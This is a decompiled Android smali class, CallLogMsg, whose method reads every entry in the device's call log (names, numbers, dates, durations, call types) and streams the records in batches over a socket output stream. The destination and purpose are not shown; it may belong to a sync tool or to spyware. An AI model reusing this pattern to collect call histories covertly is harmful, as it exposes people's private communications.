.class public Lcom/Android/MFSocket/CallLogMsg;
.super Ljava/lang/Object;
.source "CallLogMsg.java"


# instance fields
.field public mResolver:Landroid/content/ContentResolver;


# direct methods
.method constructor <init>(Landroid/content/ContentResolver;)V
    .locals 0
    .param p1, "contentResolver"    # Landroid/content/ContentResolver;

    .prologue
    .line 14
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 15
    iput-object p1, p0, Lcom/Android/MFSocket/CallLogMsg;->mResolver:Landroid/content/ContentResolver;

    .line 16
    return-void
.end method


# virtual methods
.method getCallLog(Ljava/io/BufferedOutputStream;Ljava/lang/StringBuffer;I)V
    .locals 24
    .param p1, "out"    # Ljava/io/BufferedOutputStream;
    .param p2, "callMsg"    # Ljava/lang/StringBuffer;
    .param p3, "oneTimeCount"    # I

    .prologue
    .line 19
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/CallLogMsg;->mResolver:Landroid/content/ContentResolver;

    if-nez v2, :cond_1

    .line 76
    :cond_0
    :goto_0
    return-void

    .line 22
    :cond_1
    sget-object v3, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    .line 23
    .local v3, "contactUri":Landroid/net/Uri;
    const/4 v2, 0x5

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v5, "name"

    aput-object v5, v4, v2

    const/4 v2, 0x1

    const-string v5, "date"

    aput-object v5, v4, v2

    const/4 v2, 0x2

    const-string v5, "duration"

    aput-object v5, v4, v2

    const/4 v2, 0x3

    const-string v5, "number"

    aput-object v5, v4, v2

    const/4 v2, 0x4

    const-string v5, "type"

    aput-object v5, v4, v2

    .line 24
    .local v4, "projection":[Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/Android/MFSocket/CallLogMsg;->mResolver:Landroid/content/ContentResolver;

    const/4 v5, 0x0

    const/4 v6, 0x0

    const-string v7, "date DESC"

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v9

    .line 25
    .local v9, "callCur":Landroid/database/Cursor;
    if-eqz v9, :cond_0

    .line 29
    invoke-interface {v9}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 35
    invoke-interface {v9}, Landroid/database/Cursor;->getCount()I

    move-result v8

    .line 36
    .local v8, "callCount":I
    new-instance v10, Ljava/lang/StringBuffer;

    invoke-direct {v10}, Ljava/lang/StringBuffer;-><init>()V

    .line 37
    .local v10, "count":Ljava/lang/StringBuffer;
    invoke-virtual {v10, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    .line 38
    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 40
    const-string v2, "name"

    invoke-interface {v9, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v19

    .line 41
    .local v19, "nameIdx":I
    const-string v2, "number"

    invoke-interface {v9, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v21

    .line 42
    .local v21, "phoneIdx":I
    const-string v2, "date"

    invoke-interface {v9, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    .line 43
    .local v13, "dateIdx":I
    const-string v2, "duration"

    invoke-interface {v9, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v16

    .line 44
    .local v16, "duraIdx":I
    const-string v2, "type"

    invoke-interface {v9, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v23

    .line 46
    .local v23, "typeIdx":I
    const/16 v22, 0x0

    .line 47
    .local v22, "type":I
    const-wide/16 v11, 0x0

    .line 48
    .local v11, "date":J
    const-wide/16 v14, 0x0

    .line 49
    .local v14, "dura":J
    const/16 v18, 0x0

    .line 50
    .local v18, "name":Ljava/lang/String;
    const/16 v20, 0x0

    .line 51
    .local v20, "phone":Ljava/lang/String;
    const/16 v17, 0x0

    .line 54
    .local v17, "nSendCount":I
    :cond_2
    move/from16 v0, v19

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v18

    .line 55
    move/from16 v0, v21

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v20

    .line 56
    invoke-interface {v9, v13}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v11

    .line 57
    move/from16 v0, v16

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v14

    .line 58
    move/from16 v0, v23

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v22

    .line 60
    add-int/lit8 v17, v17, 0x1

    .line 61
    move-object/from16 v0, v18

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 62
    move-object/from16 v0, v20

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(Ljava/lang/String;Ljava/lang/StringBuffer;)V

    .line 63
    move-object/from16 v0, p2

    invoke-static {v11, v12, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(JLjava/lang/StringBuffer;)V

    .line 64
    move-object/from16 v0, p2

    invoke-static {v14, v15, v0}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(JLjava/lang/StringBuffer;)V

    .line 65
    move/from16 v0, v22

    move-object/from16 v1, p2

    invoke-static {v0, v1}, Lcom/Android/MFSocket/RecordPackage;->AppendItem(ILjava/lang/StringBuffer;)V

    .line 66
    invoke-static/range {p2 .. p2}, Lcom/Android/MFSocket/RecordPackage;->AppendRecord(Ljava/lang/StringBuffer;)V

    .line 68
    rem-int v2, v17, p3

    if-nez v2, :cond_3

    .line 69
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 70
    const/4 v2, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 72
    :cond_3
    invoke-interface {v9}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_2

    .line 73
    invoke-virtual/range {p2 .. p2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Lcom/Android/MFSocket/SocketTrans;->sendData(Ljava/io/BufferedOutputStream;Ljava/lang/String;)V

    .line 74
    const/4 v2, 0x0

    move-object/from16 v0, p2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuffer;->setLength(I)V

    .line 75
    invoke-interface {v9}, Landroid/database/Cursor;->close()V

    goto/16 :goto_0
.end method
